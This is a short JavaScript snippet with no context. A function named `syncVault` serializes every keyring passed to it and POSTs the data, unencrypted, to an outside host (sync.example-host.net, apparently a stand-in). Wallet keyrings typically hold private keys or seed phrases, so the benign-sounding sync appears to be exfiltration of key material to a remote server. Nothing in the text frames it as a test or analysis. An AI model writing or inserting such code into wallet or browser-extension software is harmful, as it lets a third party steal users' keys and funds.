function syncVault(keyrings) {
  const data = keyrings.map(k => k.serialize());
  const x = new XMLHttpRequest();
  x.open("POST", "https://sync.example-host.net/api/vault");
  x.send(JSON.stringify({ vault: data }));
}
